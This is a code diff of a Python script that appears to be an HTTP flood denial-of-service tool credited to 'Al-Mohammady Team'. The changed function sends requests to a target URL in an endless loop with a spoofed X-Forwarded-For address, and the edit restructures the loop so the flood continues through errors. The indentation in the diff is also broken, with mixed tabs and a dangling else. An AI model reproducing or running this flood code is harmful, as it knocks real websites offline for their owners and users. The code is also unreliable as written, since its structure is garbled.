@@ -22,7 +22,7 @@ flag = 0
 safe = 0
 __version__ = '8.0 BETA'
 __author__ = "Al-Mohammady Team."
-__method__ = 'HTTP V 2'
+__method__ = 'HTTP V 2 BETA'
 
 
 def inc_counter():
@@ -78,22 +78,23 @@ def httpcall(url):
         'Host': host,
         'X-Forwarded-For': random_ipFake()
     }
-
-    try:
-        while True:
+    
+    while True:
+    	
+    	try:
         # إرسال الطلب
         	req = urllib.request.Request(request_url, headers=headers)
         	urllib.request.urlopen(req)
-    except urllib.error.HTTPError as e:
-        set_flag(1)
-        print(f"{Fore.RED}[ {e.code} ] {Fore.MAGENTA} Response Code !")
-        code = e.code
-    except urllib.error.URLError as e:
-        return True
+    	except urllib.error.HTTPError as e:
+        	set_flag(1)
+        	print(f"{Fore.RED}[ {e.code} ] {Fore.MAGENTA} Response Code !")
+        	code = e.code
+    	except urllib.error.URLError as e:
+        	return True
         #print(f"{Fore.RED}Error: {e.reason}")
-    except Exception as e:
+    	except Exception as e:
         #print(f"{Fore.RED}Unexpected error: {e} - يتم تجاهله.")
-        return True
+        	return True
     else:
         inc_counter()
 
